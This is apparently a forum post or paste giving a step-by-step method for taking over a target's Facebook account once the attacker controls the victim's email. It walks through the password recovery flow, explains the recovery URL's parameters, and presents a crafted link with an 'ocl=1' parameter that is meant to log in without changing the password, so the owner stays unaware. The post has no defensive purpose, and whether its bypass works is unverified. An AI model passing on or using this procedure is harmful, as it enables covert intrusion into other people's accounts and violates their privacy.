#>>
 >> we assume that we have an access an email address target.
 >> make sure ther is an account facebook on email target thats we dont khow the password.
 >> so first step we have to forget password from facebook login page, use recovery mode. 
 >> after facebook send some code, we use that code to make a new password .
 >> this link below that facebook send to email target 
    https://www.facebook.com/recover/code/?u=100004854496982&n=758454&s=23&exp_locale=id_ID&redirect_from=button
 >> explenation : u= userid target
                  n= code from facebook
                  exp_locale =location target country
                  
 >> after we click the link, facebook ask we to create a new password.
 >> ok now lets bypass it .

    https://www.facebook.com/recover/code/?u=100004854496982&n=667903&s=24&lri=9b98bf85-d95b-999f-a10b-d320bafb880b&exp_locale=en_US&ocl=1
    we can see theris some code that we make sure:
    # &redirect_from=button
    # &ocl=1
    # $lri=9b98bf85-d95b-999f-a10b-d320bafb880b
    
 >> after we see the feauture from facebook we can use it to login without change the old password
 >> just use an single code to bypass it we use from code at feature "login with an singgle click"
 >> so the complite code is :
   # https://www.facebook.com/recover/code/?u=100004854496982&n=758454&s=23&exp_locale=id_ID&ocl=1
   # remember : n= code that facebook send from recovery login
